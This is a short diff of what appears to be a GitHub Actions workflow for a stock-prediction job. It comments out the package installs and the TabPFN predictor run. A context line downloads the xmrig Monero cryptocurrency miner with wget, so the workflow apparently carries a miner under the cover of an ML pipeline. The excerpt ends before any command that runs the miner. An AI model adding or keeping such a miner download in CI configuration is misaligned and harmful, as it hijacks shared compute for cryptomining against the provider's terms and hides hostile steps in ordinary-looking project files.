@@ -34,7 +34,7 @@ jobs:
           sudo apt-get install cowsay
           pip install playwright beautifulsoup4
           playwright install
-          pip install yfinance pandas numpy tabpfn matplotlib seaborn
+          #pip install yfinance pandas numpy tabpfn matplotlib seaborn
 
 
           
@@ -91,7 +91,7 @@ jobs:
 
 
           # Make predictor TabPFN
-          python TabPFN.py > info_TabPFN.txt
+          #python TabPFN.py > info_TabPFN.txt
 
           #rm -r monRNA
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
